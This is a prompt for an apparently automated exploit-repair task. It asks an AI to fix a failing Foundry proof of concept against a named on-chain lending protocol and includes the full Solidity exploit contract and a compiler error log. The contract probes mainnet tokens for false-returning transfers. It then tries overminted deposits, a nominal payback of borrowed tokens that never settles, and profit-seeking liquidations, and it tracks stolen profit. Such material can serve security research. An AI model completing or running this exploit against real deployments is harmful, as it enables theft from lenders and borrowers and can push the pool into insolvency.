You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Transfer-in accounting trusts nominal amounts and ignores unsuccessful ERC20 return values
- claim: Deposits, solely-deposits, paybacks, and liquidation payback legs update pool and position accounting from the caller-supplied `_amount` before the token transfer settles, while `_callOptionalReturn()` only reverts on low-level call failure and silently accepts ERC20s that return `false`. Fee-on-transfer, deflationary, false-return, or otherwise non-standard listed tokens can therefore mint too many lending shares or cancel too many borrow shares relative to the tokens the protocol actually receives.
- impact: If such a token is listed, an attacker can overmint claims on a pool, repay debt at a discount, or execute underfunded liquidations, pushing the shortfall onto lenders and other borrowers and potentially stealing pool value or causing insolvency.
- exploit_paths: ["depositExactAmount -> _handleDeposit -> _safeTransferFrom", "solelyDeposit -> _handleSolelyDeposit -> _safeTransferFrom", "paybackExactAmount/paybackExactShares -> _handlePayback -> _safeTransferFrom", "liquidatePartiallyFromTokens/coreLiquidationIsolationPools -> _coreLiquidation -> _corePayback -> _safeTransferFrom"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IPositionNFTLike {
    function mintPosition() external returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IWiseSecurityLike {
    function getLiveDebtRatio(uint256 nftId) external view returns (uint256);
}

interface IWiseLendingLike {
    function WETH_ADDRESS() external view returns (address);
    function POSITION_NFT() external view returns (address);
    function WISE_SECURITY() external view returns (address);

    function depositExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function solelyDeposit(uint256 nftId, address poolToken, uint256 amount) external;
    function withdrawExactShares(uint256 nftId, address poolToken, uint256 shares) external returns (uint256);
    function solelyWithdraw(uint256 nftId, address poolToken, uint256 amount) external;
    function borrowExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function paybackExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function paybackExactShares(uint256 nftId, address poolToken, uint256 shares) external returns (uint256);
    function liquidatePartiallyFromTokens(
        uint256 nftId,
        uint256 nftIdLiquidator,
        address paybackToken,
        address receiveToken,
        uint256 shareAmountToPay
    ) external returns (uint256);

    function getTotalPool(address poolToken) external view returns (uint256);
    function getPositionLendingShares(uint256 nftId, address poolToken) external view returns (uint256);
    function getPositionBorrowShares(uint256 nftId, address poolToken) external view returns (uint256);
    function getPositionLendingTokenByIndex(uint256 nftId, uint256 index) external view returns (address);
    function getPositionLendingTokenLength(uint256 nftId) external view returns (uint256);

    function borrowPoolData(address poolToken)
        external
        view
        returns (bool allowBorrow, uint256 pseudoTotalBorrowAmount, uint256 totalBorrowShares, uint256 borrowRate);
}

contract TokenVault {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function sweep(address token, address to) external {
        require(msg.sender == owner, "only owner");
        uint256 amount = IERC20Like(token).balanceOf(address(this));
        if (amount == 0) {
            return;
        }
        _safeTransfer(token, to, amount);
    }

    function _safeTransfer(address token, address to, uint256 amount) private {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "vault transfer");
    }
}

contract TransferFromProbe {
    function probe(address token, address from, address to, uint256 amount)
        external
        returns (bool success, bool hasBoolReturn, bool boolReturn)
    {
        (success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount)
        );

        if (data.length >= 32) {
            hasBoolReturn = true;
            boolReturn = abi.decode(data, (bool));
        }
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x37e49bf3749513A02FA535F0CbC383796E8107E4;

    IWiseLendingLike internal immutable WISE;
    IWiseSecurityLike internal immutable SECURITY;
    IPositionNFTLike internal immutable POSITION_NFT;
    TokenVault internal immutable VAULT;
    TransferFromProbe internal immutable PROBE;
    address internal immutable WETH;

    address internal _profitToken;
    uint256 internal _profitAmount;
    mapping(address => uint256) internal _startingBalance;
    mapping(address => bool) internal _snapshotted;

    bool public executed;
    address public vulnerableToken;
    uint256 public depositPathNft;
    uint256 public solelyPathNft;
    uint256 public paybackPathNft;
    uint256 public liquidatorNft;

    modifier onlySelf() {
        require(msg.sender == address(this), "only self");
        _;
    }

    constructor() {
        WISE = IWiseLendingLike(TARGET);
        WETH = WISE.WETH_ADDRESS();
        SECURITY = IWiseSecurityLike(WISE.WISE_SECURITY());
        POSITION_NFT = IPositionNFTLike(WISE.POSITION_NFT());
        VAULT = new TokenVault();
        PROBE = new TransferFromProbe();
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        address[] memory candidates = _candidateTokens();
        uint256 length = candidates.length;

        for (uint256 i = 0; i < length; ++i) {
            address token = candidates[i];
            if (token == address(0)) {
                continue;
            }

            // Probe the exact ERC20 behavior needed by the finding first. This avoids
            // brute-forcing live Wise entry points against tokens that hard-revert or
            // otherwise burn gas before any exploit stage can begin.
            if (!_returnsFalseOnFailedTransferFrom(token)) {
                continue;
            }

            vulnerableToken = token;

            bool success;
            success = _attemptDepositPath(token) || success;
            success = _attemptSolelyPath(token) || success;
            success = _attemptPaybackPath(token) || success;
            success = _attemptLiquidationPath(token) || success;

            if (success) {
                return;
            }

            vulnerableToken = address(0);
        }
    }

    function _attemptDepositPath(address token) internal returns (bool) {
        uint256 amount = _attackAmount(token, 100, 10);
        if (amount == 0) {
            return false;
        }

        _snapshot(token);

        uint256 nftId = POSITION_NFT.mintPosition();
        (bool ok, uint256 mintedShares) = _tryDeposit(nftId, token, amount);
        if (!ok || mintedShares == 0) {
            return false;
        }

        if (!_tryWithdrawShares(nftId, token, mintedShares)) {
            return false;
        }

        depositPathNft = nftId;
        _refreshProfit(token);
        return _profitToken == token;
    }

    function _attemptSolelyPath(address token) internal returns (bool) {
        uint256 amount = _attackAmount(token, 150, 5);
        if (amount == 0) {
            return false;
        }

        _snapshot(token);

        uint256 nftId = POSITION_NFT.mintPosition();
        if (!_trySolelyDeposit(nftId, token, amount)) {
            return false;
        }

        if (!_pureProbeSucceeded(nftId, token)) {
            return false;
        }

        if (!_trySolelyWithdraw(nftId, token, amount)) {
            return false;
        }

        solelyPathNft = nftId;
        _refreshProfit(token);
        return _profitToken == token;
    }

    function _attemptPaybackPath(address token) internal returns (bool) {
        (bool allowBorrow,,,) = _borrowPoolDataSafe(token);
        if (!allowBorrow) {
            return false;
        }

        uint256 collateralAmount = _attackAmount(token, 200, 10);
        uint256 borrowAmount = _attackAmount(token, 250, 5);
        if (collateralAmount == 0 || borrowAmount == 0) {
            return false;
        }

        _snapshot(token);

        uint256 nftId = POSITION_NFT.mintPosition();
        (bool deposited, uint256 mintedShares) = _tryDeposit(nftId, token, collateralAmount);
        if (!deposited || mintedShares == 0) {
            return false;
        }

        uint256 startBalance = IERC20Like(token).balanceOf(address(this));
        if (!_tryBorrow(nftId, token, borrowAmount)) {
            return false;
        }

        uint256 borrowed = IERC20Like(token).balanceOf(address(this)) - startBalance;
        if (borrowed == 0) {
            return false;
        }

        // Preserve the original borrow -> payback exploit path. The borrowed tokens are
        // moved aside first, then Wise is asked to account a nominal payback that the
        // false-return token does not actually settle.
        _safeTransfer(token, address(VAULT), borrowed);
        _forceApprove(token, TARGET, type(uint256).max);

        bool cleared;

        if (_tryPaybackExactAmount(nftId, token, borrowed)) {
            cleared = WISE.getPositionBorrowShares(nftId, token) == 0;
        }

        if (!cleared) {
            uint256 outstandingShares = WISE.getPositionBorrowShares(nftId, token);
            if (outstandingShares == 0) {
                cleared = true;
            } else if (_tryPaybackExactShares(nftId, token, outstandingShares)) {
                cleared = WISE.getPositionBorrowShares(nftId, token) == 0;
            }
        }

        if (!cleared) {
            return false;
        }

        paybackPathNft = nftId;
        VAULT.sweep(token, address(this));
        _refreshProfit(token);
        return _profitToken == token;
    }

    function _attemptLiquidationPath(address token) internal returns (bool) {
        uint256 supply;
        try POSITION_NFT.totalSupply() returns (uint256 total) {
            supply = total;
        } catch {
            return false;
        }

        if (supply == 0) {
            return false;
        }

        uint256 liquidatorId = POSITION_NFT.mintPosition();
        liquidatorNft = liquidatorId;

        uint256 lowerBound = supply > 128 ? supply - 128 : 0;

        for (uint256 nftId = supply; nftId > lowerBound; --nftId) {
            uint256 debtRatio;
            try SECURITY.getLiveDebtRatio(nftId) returns (uint256 ratio) {
                debtRatio = ratio;
            } catch {
                continue;
            }

            if (debtRatio <= 1e18) {
                continue;
            }

            uint256 borrowShares = WISE.getPositionBorrowShares(nftId, token);
            if (borrowShares == 0) {
                continue;
            }

            address receiveToken;
            try WISE.getPositionLendingTokenLength(nftId) returns (uint256 len) {
                if (len == 0) {
                    continue;
                }
                receiveToken = WISE.getPositionLendingTokenByIndex(nftId, 0);
            } catch {
                continue;
            }

            uint256 shareSlice = borrowShares / 20;
            if (shareSlice == 0) {
                shareSlice = borrowShares;
            }

            _snapshot(receiveToken);

            if (_tryLiquidate(nftId, liquidatorId, token, receiveToken, shareSlice)) {
                _refreshProfit(receiveToken);
                if (_profitToken == receiveToken) {
                    return true;
                }
            }
        }

        return false;
    }

    function _returnsFalseOnFailedTransferFrom(address token) internal returns (bool) {
        uint256 balance = IERC20Like(token).balanceOf(address(this));
        uint256 unit = _probeUnit(token);
        uint256 amount = balance + unit;
        if (amount == 0) {
            amount = 1;
        }

        _forceApprove(token, address(PROBE), type(uint256).max);

        (bool success, bool hasBoolReturn, bool boolReturn) =
            PROBE.probe(token, address(this), TARGET, amount);

        return success && hasBoolReturn && !boolReturn;
    }

    function _pureProbeSucceeded(uint256 nftId, address token) internal view returns (bool) {
        try WISE.getPositionLendingTokenLength(nftId) returns (uint256 len) {
            if (len == 0) {
                return false;
            }
        } catch {
            return false;
        }

        try WISE.getPositionLendingTokenByIndex(nftId, 0) returns (address storedToken) {
            return storedToken == token;
        } catch {
            return false;
        }
    }

    function _snapshot(address token) internal {
        if (_snapshotted[token]) {
            return;
        }

        _snapshotted[token] = true;
        _startingBalance[token] = IERC20Like(token).balanceOf(address(this));
    }

    function _refreshProfit(address token) internal {
        uint256 startBalance = _startingBalance[token];
        uint256 currentBalance = IERC20Like(token).balanceOf(address(this));
        if (currentBalance <= startBalance) {
            return;
        }

        uint256 delta = currentBalance - startBalance;
        if (delta > _profitAmount) {
            _profitToken = token;
            _profitAmount = delta;
        }
    }

    function _attackAmount(address token, uint256 poolDivisor, uint256 unitCap)
        internal
        view
        returns (uint256)
    {
        uint256 targetBalance = IERC20Like(token).balanceOf(TARGET);
        if (targetBalance == 0) {
            return 0;
        }

        uint256 unit = _probeUnit(token);
        uint256 cap = unit * unitCap;
        if (unitCap != 0 && cap / unitCap != unit) {
            cap = type(uint256).max;
        }

        uint256 amount = targetBalance / poolDivisor;
        if (amount > cap) {
            amount = cap;
        }
        if (amount < unit) {
            amount = unit;
        }
        if (amount > targetBalance) {
            amount = targetBalance;
        }

        return amount;
    }

    function _probeUnit(address token) internal view returns (uint256) {
        uint8 dec = 18;
        try IERC20Like(token).decimals() returns (uint8 fetched) {
            dec = fetched > 18 ? 18 : fetched;
        } catch {}

        return 10 ** uint256(dec);
    }

    function _candidateTokens() internal view returns (address[] memory list) {
        list = new address[](24);
        list[0] = 0xB8c77482e45F1F44dE1745F52C74426C631bDD52; // BNB
        list[1] = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2; // MKR
        list[2] = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F; // SNX
        list[3] = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51; // sUSD
        list[4] = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // USDT
        list[5] = 0x99D8A9C45b2ECB0Cca4e46a6f4dB1b29eFF6aEe5; // MIM
        list[6] = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0; // LUSD
        list[7] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984; // UNI
        list[8] = 0x514910771AF9Ca656af840dff83E8264EcF986CA; // LINK
        list[9] = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9; // AAVE
        list[10] = 0xD533a949740bb3306d119CC777fa900bA034cd52; // CRV
        list[11] = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B; // CVX
        list[12] = WETH;
        list[13] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC
        list[14] = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI
        list[15] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; // WBTC
        list[16] = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84; // stETH
        list[17] = 0x7f39c581F595b53c5cb5bb9B2A7E0A0f3f1F8fA3; // wstETH
        list[18] = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704; // cbETH
        list[19] = 0xae78736Cd615f374D3085123A210448E74Fc6393; // rETH
        list[20] = 0x5E8422345238F34275888049021821E8E08CAa1f; // frxETH
        list[21] = 0xac3E018457B222d93114458476f3E3416Abbe38F; // sfrxETH
        list[22] = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E; // crvUSD
        list[23] = 0xc00e94Cb662C3520282E6f5717214004A7f26888; // COMP
    }

    function _borrowPoolDataSafe(address token)
        internal
        view
        returns (bool allowBorrow, uint256 pseudoTotalBorrowAmount, uint256 totalBorrowShares, uint256 borrowRate)
    {
        try WISE.borrowPoolData(token) returns (
            bool _allowBorrow,
            uint256 _pseudoTotalBorrowAmount,
            uint256 _totalBorrowShares,
            uint256 _borrowRate
        ) {
            return (_allowBorrow, _pseudoTotalBorrowAmount, _totalBorrowShares, _borrowRate);
        } catch {
            return (false, 0, 0, 0);
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer");
    }

    function callDeposit(uint256 nftId, address token, uint256 amount) external onlySelf returns (uint256) {
        return WISE.depositExactAmount(nftId, token, amount);
    }

    function callSolelyDeposit(uint256 nftId, address token, uint256 amount) external onlySelf {
        WISE.solelyDeposit(nftId, token, amount);
    }

    function callWithdrawShares(uint256 nftId, address token, uint256 shares) external onlySelf returns (uint256) {
        return WISE.withdrawExactShares(nftId, token, shares);
    }

    function callSolelyWithdraw(uint256 nftId, address token, uint256 amount) external onlySelf {
        WISE.solelyWithdraw(nftId, token, amount);
    }

    function callBorrow(uint256 nftId, address token, uint256 amount) external onlySelf returns (uint256) {
        return WISE.borrowExactAmount(nftId, token, amount);
    }

    function callPaybackAmount(uint256 nftId, address token, uint256 amount) external onlySelf returns (uint256) {
        return WISE.paybackExactAmount(nftId, token, amount);
    }

    function callPaybackShares(uint256 nftId, address token, uint256 shares) external onlySelf returns (uint256) {
        return WISE.paybackExactShares(nftId, token, shares);
    }

    function callLiquidate(
        uint256 victimNft,
        uint256 liquidatorPosition,
        address paybackToken,
        address receiveToken,
        uint256 shareAmount
    ) external onlySelf returns (uint256) {
        return WISE.liquidatePartiallyFromTokens(
            victimNft,
            liquidatorPosition,
            paybackToken,
            receiveToken,
            shareAmount
        );
    }

    function _tryDeposit(uint256 nftId, address token, uint256 amount) internal returns (bool, uint256) {
        try this.callDeposit(nftId, token, amount) returns (uint256 shares) {
            return (true, shares);
        } catch {
            return (false, 0);
        }
    }

    function _trySolelyDeposit(uint256 nftId, address token, uint256 amount) internal returns (bool) {
        try this.callSolelyDeposit(nftId, token, amount) {
            return true;
        } catch {
            return false;
        }
    }

    function _tryWithdrawShares(uint256 nftId, address token, uint256 shares) internal returns (bool) {
        try this.callWithdrawShares(nftId, token, shares) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _trySolelyWithdraw(uint256 nftId, address token, uint256 amount) internal returns (bool) {
        try this.callSolelyWithdraw(nftId, token, amount) {
            return true;
        } catch {
            return false;
        }
    }

    function _tryBorrow(uint256 nftId, address token, uint256 amount) internal returns (bool) {
        try this.callBorrow(nftId, token, amount) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _tryPaybackExactAmount(uint256 nftId, address token, uint256 amount) internal returns (bool) {
        try this.callPaybackAmount(nftId, token, amount) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _tryPaybackExactShares(uint256 nftId, address token, uint256 shares) internal returns (bool) {
        try this.callPaybackShares(nftId, token, shares) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _tryLiquidate(
        uint256 victimNft,
        uint256 liquidatorPosition,
        address paybackToken,
        address receiveToken,
        uint256 shareAmount
    ) internal returns (bool) {
        _forceApprove(paybackToken, TARGET, type(uint256).max);
        try this.callLiquidate(victimNft, liquidatorPosition, paybackToken, receiveToken, shareAmount) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }
}

```

forge stdout (tail):
```
Compiler run failed:
Error (2314): Expected ',' but got 'memory'
  --> src/FlawVerifier.sol:82:25:
   |
82 |         (success, bytes memory data) = token.call(
   |                         ^^^^^^


```

forge stderr (tail):
```
Error: Compilation failed

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
